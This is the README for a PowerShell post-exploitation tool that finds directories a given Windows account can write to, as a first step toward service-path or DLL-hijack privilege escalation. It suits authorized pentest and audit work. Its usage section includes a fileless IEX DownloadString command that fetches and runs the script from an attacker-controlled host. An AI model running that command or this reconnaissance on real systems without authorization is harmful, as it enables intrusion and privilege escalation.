# Find-WritableDirs

PowerShell post-exploitation helper for Windows privesc: recursively walks a
directory tree and reports every subdirectory that a given identity (or the
account currently running the script) can write to via a **non-inherited**
ACE — the classic setup for a writable-service-path or DLL-hijack privesc.

Adapted from hinchley's
[UserWritableLocations.ps1](https://gist.github.com/hinchley/ade9528e5ce986e9a8131489ad852789).

## What it does

- Walks `BaseDir` recursively and pulls the ACL for every directory found.
- Maps `GENERIC_*` rights on each non-inherited ACE to their concrete
  `FILE_GENERIC_*` equivalents, then checks for a write-capable right
  (`WriteData`, `CreateFiles`, `Modify`, `FullControl`, etc.).
- Reports a directory if the matching ACE's identity satisfies
  `-IdentityFilter`, or is granted directly to the account running the
  script (name or SID — see `-SkipCurrentUser`).
- Prints a results table and exports the same rows to CSV.
- Self-contained in a single function with no `$PSScriptRoot` dependency, so
  it loads cleanly via `IEX`.

## Requirements

- Windows PowerShell 2.0+ (no external modules).

## Usage

Dot-source the script, then call the function (loading it alone runs nothing):

```powershell
. .\Find-WritableDirs.ps1

# basic use, scan C:\ (default BaseDir is C:\Windows)
Find-WritableDirs -BaseDir C:\

# target a specific service account instead of Users/Everyone
Find-WritableDirs -BaseDir C:\ -IdentityFilter "LOCAL SERVICE"

# write results to a specific file (default: .\UserWritableLocations.csv)
Find-WritableDirs -BaseDir C:\xampp -OutFile C:\Windows\Tasks\wd.csv
```

In-memory / no file on disk:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Find-WritableDirs.ps1')
Find-WritableDirs -BaseDir C:\ -OutFile "$env:TEMP\wd.csv"
```

## Parameters

- **`-BaseDir`** — root directory to scan recursively. Default: `C:\Windows`.
- **`-OutFile`** — CSV output path. Default: `.\UserWritableLocations.csv`
  (resolved against the current working directory, so it's safe under `IEX`
  where `$PSScriptRoot` isn't available).
- **`-IdentityFilter`** — regex tested against each ACE's `IdentityReference`.
  Default matches Users/Everyone-style groups. Pass a service account name to
  target it specifically, or `.*` to match every non-inherited write ACE
  regardless of identity. Runs independently of the current-user check below.
- **`-SkipCurrentUser`** — by default the script also reports write ACEs
  granted directly to the account running it, even if `-IdentityFilter`
  doesn't match (checked by both name and SID, in case Windows can't resolve
  a friendly name). Pass this switch to disable that and go by
  `-IdentityFilter` alone.

## Notes

- A full-tree ACL walk (e.g. `-BaseDir C:\`) can take a while — it's calling
  `Get-Acl` on every directory found.
- Only non-inherited ACEs are considered; inherited permissions are noise for
  this purpose (they reflect the parent's ACL, not a deliberate grant).

## Authorized use only

For use in engagements you are **explicitly authorized** to test (pentests, CTFs,
your own labs). You are responsible for how you use it.
